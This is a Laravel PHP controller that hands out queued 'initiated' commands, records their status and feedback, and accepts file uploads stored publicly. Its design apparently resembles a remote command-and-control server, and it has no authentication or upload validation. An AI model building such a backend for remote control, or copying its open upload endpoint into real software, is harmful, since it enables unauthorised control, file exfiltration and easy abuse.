<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;


use App\Models\Command;

class CommandController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function getCommands()
    {
        $command=Command::where("status","initiated")->orderBy("id","asc")->take(1)->get();

        return $command[0]->command."*".$command[0]->id."*"."SUCCESS";
    }

    public function PutCommandStatus($id,$status)
    {
        $Command=Command::find($id);

        $Command->status=$status;

        $Command->Save();

        return "ok";
    }

    public function PutCommandFeedBack(Request $request)
    {
        $Command=Command::find($request->id);

        $Command->feedback=$request->feedback;

        $Command->Save();

        return "ok";
    }

    public function putFile(Request $request)
    {
        if($request->hasFile('file')){

            $path=$request->file->storePublicly("uploaded_files");

            return $path;

        }else{

            return "error uploading file";
        }
    }
    
    public function store(Request $request)
    {
        
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
